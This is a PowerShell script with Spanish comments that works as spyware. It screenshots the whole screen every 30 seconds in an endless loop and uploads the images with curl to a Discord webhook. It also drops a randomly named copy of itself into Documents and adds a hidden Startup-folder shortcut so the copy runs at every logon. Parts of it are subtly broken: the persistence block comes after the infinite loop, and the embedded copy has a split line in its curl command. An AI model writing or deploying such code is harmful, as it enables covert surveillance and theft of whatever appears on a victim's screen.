# Definir la URL del webhook de Discord
$hookurl = "$dc"
# Definir el intervalo de tiempo entre capturas de pantalla en segundos
$seconds = 30

# shortened URL Detection
if ($hookurl.Ln -ne 121){
    Write-Host "Shortened Webhook URL Detected.." 
    $hookurl = (irm $hookurl).url
}

# Bucle principal: tomar dos capturas de pantalla cada 30 segundos
While ($true){
    # Definir la ruta y el nombre de archivo para la captura de pantalla
    $file1 = "$env:temp\SC1.png"
    $file2 = "$env:temp\SC2.png"
    
    # Tomar la primera captura de pantalla
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($file1, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Esperar un segundo antes de tomar la segunda captura de pantalla
    Start-Sleep -Seconds 1
    
    # Tomar la segunda captura de pantalla
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($file2, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Enviar ambas capturas de pantalla al webhook de Discord
    curl.exe -F "file1=@$file1" -F "file2=@$file2" $hookurl
    
    # Eliminar las capturas de pantalla después de enviarlas
    Remove-Item -Path $file1
    Remove-Item -Path $file2
    
    # Esperar el intervalo de tiempo especificado antes de tomar las próximas capturas de pantalla
    Start-Sleep -Seconds $seconds
}

# Obtener la carpeta de documentos del usuario actual
$documentsFolder = [Environment]::GetFolderPath("MyDocuments")

# Generar un nombre aleatorio para el archivo de script
$randomFileName = [System.IO.Path]::GetRandomFileName() + ".ps1"

# Ruta completa del archivo de script en la carpeta de documentos
$scriptPath = Join-Path -Path $documentsFolder -ChildPath $randomFileName

# Guardar el script en la carpeta de documentos
$scriptContent = @"
# Definir la URL del webhook de Discord
`$hookurl = "$dc"`
# Definir el intervalo de tiempo entre capturas de pantalla en segundos
`$seconds = 30`

# shortened URL Detection
if (`$hookurl.Ln -ne 121){
    Write-Host "Shortened Webhook URL Detected.." 
    `$hookurl = (irm `$hookurl).url
}

# Bucle principal: tomar dos capturas de pantalla cada 30 segundos
While (`$true){
    # Definir la ruta y el nombre de archivo para la captura de pantalla
    `$file1 = "$env:temp\SC1.png"`
    `$file2 = "$env:temp\SC2.png"`
    
    # Tomar la primera captura de pantalla
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    `$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    `$Width = `$Screen.Width
    `$Height = `$Screen.Height
    `$Left = `$Screen.Left
    `$Top = `$Screen.Top
    `$bitmap = New-Object System.Drawing.Bitmap `$Width, `$Height
    `$graphic = [System.Drawing.Graphics]::FromImage(`$bitmap)
    `$graphic.CopyFromScreen(`$Left, `$Top, 0, 0, `$bitmap.Size)
    `$bitmap.Save(`$file1, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Esperar un segundo antes de tomar la segunda captura de pantalla
    Start-Sleep -Seconds 1
    
    # Tomar la segunda captura de pantalla
    `$bitmap = New-Object System.Drawing.Bitmap `$Width, `$Height
    `$graphic = [System.Drawing.Graphics]::FromImage(`$bitmap)
    `$graphic.CopyFromScreen(`$Left, `$Top, 0, 0, `$bitmap.Size)
    `$bitmap.Save(`$file2, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Enviar ambas capturas de pantalla al webhook de Discord
    curl.exe -F "file1=@`$file1" -F "file2=@`$file
" $hookurl
    
    # Eliminar las capturas de pantalla después de enviarlas
    Remove-Item -Path `$file1
    Remove-Item -Path `$file2
    
    # Esperar el intervalo de tiempo especificado antes de tomar las próximas capturas de pantalla
    Start-Sleep -Seconds `$seconds
}
"@

# Guardar el script en la carpeta de documentos
Set-Content -Path $scriptPath -Value $scriptContent

# Obtener la carpeta de inicio del usuario actual
$startupFolder = [Environment]::GetFolderPath("Startup")

# Crear un acceso directo del script en la carpeta de inicio para que se ejecute al iniciar Windows
$shortcutPath = Join-Path -Path $startupFolder -ChildPath "$randomFileName.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -File $scriptPath"
$Shortcut.Save()
